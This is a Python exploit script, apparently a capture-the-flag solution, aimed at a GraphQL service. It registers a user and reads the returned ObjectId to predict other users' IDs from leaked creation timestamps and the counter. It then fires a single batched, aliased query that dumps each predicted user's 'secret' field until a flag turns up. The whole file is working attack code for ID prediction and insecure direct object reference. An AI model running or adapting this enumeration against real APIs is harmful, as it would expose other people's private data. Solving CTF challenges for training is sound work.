from datetime import datetime, timezone
import requests
import json
import uuid

GRAPHQL_URL = "http://localhost:4000/graphql"
# GRAPHQL_URL = "https://gear5-06dffe5c48ac6a2d.ctf.clawtheflag.com/graphql"
# ----------------------------
# 1️⃣ Get target timestamp from existing user
# ----------------------------
timestamp_query = {
    "query": """
    query {
      allUsersTimestamps {
        createdAt
      }
    }
    """
}

headers = {
    "Content-Type": "application/json",
    "Accept": "*/*",
    "User-Agent": "PythonRequests/2.x"
}

proxies = {
    'http': "http://127.0.0.1:8080",
    'https': "http://127.0.0.1:8080",
}

response = requests.post(GRAPHQL_URL, proxies=proxies, headers=headers, data=json.dumps(timestamp_query))
if response.status_code != 200:
    print("Failed to fetch target timestamp:", response.text)
    exit(1)

data = response.json()
# Take the first user in the list as the target
target_timestamps = data["data"]["allUsersTimestamps"]

unique_timestamps = set()
for i, ts in enumerate(target_timestamps):
    unique_timestamps.add(ts["createdAt"])

print(f"Found {len(unique_timestamps)} unique timestamps.")
print(unique_timestamps)
for ts in unique_timestamps:
  target_user = {"createdAt": ts}
  created_at_timestamp_ms = int(target_user["createdAt"])


  # Convert to datetime
  created_at_dt = datetime.utcfromtimestamp(created_at_timestamp_ms / 1000)
  time_hex = int(created_at_timestamp_ms / 1000).to_bytes(4, "big").hex()
  print(f"Converted timestamp to hex: {time_hex}")

  # ----------------------------
  # 2️⃣ Register new user
  # ----------------------------
  new_user = {
      "username": "aasdf"+uuid.uuid4().hex[:6],
      "email": "aa"+uuid.uuid4().hex[:6]+"@g.com",
      "password": "asdfasdf",
      "secret": "asdfasdf"
  }

  register_payload = {
      "query": """
        mutation Register($username: String!, $email: String!, $password: String!, $secret: String!) {
          register(username: $username, email: $email, password: $password, secret: $secret) {
            token
            user {
              id
              username
              email
            }
          }
        }
      """,
      "variables": new_user
  }

  response = requests.post(GRAPHQL_URL, headers=headers, data=json.dumps(register_payload))
  register_data = response.json()
  print(register_data)
  user_id = register_data["data"]["register"]["user"]["id"]
  print(f"Registered user ID: {user_id}")

  # ----------------------------
  # 3️⃣ Extract tmp and counter from user ID
  # ----------------------------
  tmp_id_part = user_id[8:18]  # middle part
  counter = int(user_id[-6:], 16)
  print(f"tmp_id_part: {tmp_id_part} | counter: {hex(counter)}")

  # ----------------------------
  # 4️⃣ Generate UUIDs
  # ----------------------------
  uuids = [f"{time_hex}{tmp_id_part}{i:06x}" for i in range(counter - 0x100, counter)]

  # Save UUIDs to file
  with open("uuids.txt", "w") as f:
      f.writelines(f"{uuid}\n" for uuid in uuids)

  # ----------------------------
  # 5️⃣ Build GraphQL query
  # ----------------------------
  query_lines = [
      f"u{uuid}:userSensitive(id:\"{uuid}\") {{secret}}"
      for uuid in uuids
  ]


  print(f'start at uuids {uuids[0]}')
  print(f'end at uuids   {uuids[-1]}')

  graphql_query = "query{" + "\n".join(query_lines) + "}"

  with open("graphql_query.txt", "w") as f:
      f.write(graphql_query)

  # ----------------------------
  # 6️⃣ Send GraphQL request
  # ----------------------------
  payload = {"query": graphql_query}

  response = requests.post(GRAPHQL_URL, headers=headers, data=json.dumps(payload))
  print(f"Status code: {response.status_code}")
  # print(json.dumps(response.json(), indent=2))

  result = response.json().get("data", {})

  for key, value in result.items():
      if value and 'cybears{' in value.get("secret", ""):
          print(f"Found flag in {key}: {value['secret']}")
          exit(0)
